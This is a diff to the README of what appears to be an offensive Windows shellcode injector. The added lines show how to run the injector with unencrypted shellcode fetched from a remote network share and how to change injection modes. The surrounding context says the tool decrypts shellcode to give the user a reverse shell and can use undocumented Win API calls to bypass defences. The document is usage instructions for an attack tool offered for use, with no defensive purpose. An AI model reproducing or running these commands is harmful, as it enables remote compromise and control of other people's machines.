@@ -41,6 +41,13 @@ Injector.exe -m=1 -shellcode -encrypt-aes -pass=password -location="\\192.x.x.x\
 ```
 This is will decrypt your shellcode and give you reverse shell. Presence of bypass flag instructs injector to use some other ways to get reverse shell i.e using some undocumented Win API.
 
+In case you dont wanna use encrypted shellcode, you can also run it simply like below
+
+```
+Injector.exe -m=1 -shellcode -location="\\192.x.x.x\share\shellcode.txt"
+```
+Just change the -m=1 to 2,3,4,6 to run other modes. 
+
 ```
 Injector.exe -m=5 -TempFile=C:\\Users\\user\\sample.txt
 ```
